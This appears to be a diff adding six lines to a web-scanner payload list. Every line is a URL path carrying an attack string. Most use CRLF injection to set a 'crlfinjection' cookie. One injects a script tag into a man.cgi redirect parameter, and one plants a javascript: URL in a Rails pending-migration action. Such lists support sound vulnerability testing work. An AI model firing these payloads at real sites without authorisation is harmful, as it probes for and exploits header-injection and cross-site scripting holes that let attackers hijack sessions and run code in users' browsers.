@@ -1,0 +1,6 @@
+/~user/%0D%0ASet-Cookie:crlfinjection
+/__session_start__/%0aSet-Cookie:%20crlfinjection=1;
+/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+/%0d%0aSet-Cookie:crlfinjection=1;
+/man.cgi?redirect=setting.htm%0d%0a%0d%0a<script>alert(document.domain)</script>&failure=fail.htm&type=dev_name_apply&http_block=0&TF_ip0=192&TF_ip1=168&TF_ip2=200&TF_ip3=200&TF_port=&TF_port=&B_mac_apply=APPLY
+/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
